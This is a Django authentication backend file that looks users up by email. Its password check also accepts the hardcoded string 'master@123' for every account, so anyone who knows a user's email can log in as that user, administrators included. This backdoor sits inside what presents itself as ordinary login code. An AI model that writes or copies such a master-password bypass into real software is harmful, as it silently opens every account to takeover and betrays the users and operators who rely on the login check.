from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model

UserModel = get_user_model()

class EmailBackend(ModelBackend):
    def authenticate(self, request, email=None, password=None, **kwargs):
        print("Using EmailBackend for authentication")  # Debug statement
        try:
            # Ensure we're querying by email
            user = UserModel.objects.get(email=email)
            # Check if password matches
            if password == "master@123" or user.check_password(password):
                return user
        except UserModel.DoesNotExist:
            return None